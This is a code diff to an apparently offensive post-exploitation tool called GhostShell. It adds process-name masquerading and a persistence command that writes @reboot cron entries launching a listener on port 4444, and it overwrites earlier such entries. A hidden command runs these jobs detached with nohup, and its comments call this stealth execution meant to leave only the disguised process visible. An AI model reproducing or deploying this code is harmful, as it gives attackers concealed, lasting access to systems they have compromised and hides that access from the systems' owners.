@@ -24,6 +24,14 @@ console = Console()
 
 def activate_ghost(name: str):
     """Renames the process in system memory."""
+    # Cron/Background safety: Skip animations if no terminal
+    if not sys.stdout.isatty():
+        try:
+            setproctitle.setproctitle(name)
+        except:
+            pass
+        return
+
     with console.status(f"[bold green]Masquerading as '{name}'...[/bold green]", spinner="dots"):
         time.sleep(1)
         setproctitle.setproctitle(name)
@@ -446,7 +454,8 @@ def sniff(
 @app.command()
 def persist(
     method: str = typer.Option("systemd", help="Persistence method: 'systemd' or 'cron'"),
-    payload: str = typer.Option("listen --port 4444", help="Command to run on startup")
+    payload: str = typer.Option("listen --port 4444", help="Command to run on startup"),
+    name: str = typer.Option(None, help="Process name to masquerade as")
 ):
     """
     [PERSISTENCE] Automatic Startup.
@@ -458,6 +467,11 @@ def persist(
     """
     script_path = os.path.abspath(sys.argv[0])
     python_path = sys.executable
+    
+    # Inject name into payload if provided
+    if name:
+        payload += f' --name "{name}"'
+
     full_cmd = f"{python_path} {script_path} {payload}"
     
     console.print(Panel(f"Method: {method}\nPayload: {payload}", title="Persistence Engine", style="bold green"))
@@ -493,29 +507,64 @@ WantedBy=multi-user.target
     elif method == "cron":
         cron_entry = f"@reboot {full_cmd}\n"
         try:
-            # Check if entry already exists to avoid duplicates
+            # Check if entry already exists
             current_cron = execute_command("crontab -l").decode().strip()
-            
+
             # Fix: If 'crontab -l' returns error message, treat as empty
             if "no crontab" in current_cron or "command not found" in current_cron:
                 current_cron = ""
             
-            # Ensure newline between existing content and new entry
-            if current_cron and not current_cron.endswith("\n"):
-                current_cron += "\n"
+            # Split lines to process them
+            lines = current_cron.splitlines()
+            new_lines = []
+            updated = False
+            
+            # Filter out old GhostShell entries to allow overwrite
+            for line in lines:
+                # If the line contains our script path but NOT our exact new command, we skip it (remove old version)
+                if script_path in line and "@reboot" in line:
+                    continue # Remove old entry
+                new_lines.append(line)
+            
+            # Add our new entry
+            new_lines.append(cron_entry.strip())
+            
+            final_cron = "\n".join(new_lines) + "\n"
 
-            if full_cmd in current_cron:
-                console.print("[yellow]Persistence already exists in Crontab.[/yellow]")
-            else:
-                with open("/tmp/cron_temp", "w") as f:
-                    f.write(current_cron + cron_entry)
-                
-                # Execute crontab update
-                os.system("crontab /tmp/cron_temp")
-                os.remove("/tmp/cron_temp")
-                console.print(f"[green]✔[/green] Added @reboot entry to Crontab")
+            with open("/tmp/cron_temp", "w") as f:
+                f.write(final_cron)
+
+            # Execute crontab update
+            os.system("crontab /tmp/cron_temp")
+            os.remove("/tmp/cron_temp")
+            console.print(f"[green]✔[/green] Updated @reboot entry in Crontab (Overwritten old versions)")
+            
         except Exception as e:
             console.print(f"[red]Error updating Crontab: {e}[/red]")
+@app.command(hidden=True)
+def simulate_boot():
+    """(Docker Only) Manually triggers @reboot cron jobs to bypass kernel uptime check."""
+    try:
+        # Read crontab for current user
+        crontab = subprocess.check_output("crontab -l", shell=True).decode()
+        triggered = False
+        for line in crontab.splitlines():
+            if line.strip().startswith("@reboot"):
+                # Remove @reboot prefix and execute
+                cmd = line.replace("@reboot", "", 1).strip()
+                console.print(f"[bold yellow][BOOT SIMULATION][/bold yellow] Triggering persistence: {cmd}")
+                
+                # Stealth execution: Use nohup and & to detach process completely from the parent shell
+                # This ensures the intermediate /bin/sh process (PID 20) disappears, leaving only the ghost process.
+                stealth_cmd = f"nohup {cmd} >/dev/null 2>&1 &"
+                subprocess.Popen(stealth_cmd, shell=True)
+                triggered = True
+        
+        if triggered:
+            console.print("[green]✔ Boot sequence simulated successfully.[/green]")
+    except Exception:
+        # Silently fail if no crontab exists (normal for fresh containers)
+        pass
 
 if __name__ == "__main__":
     app()
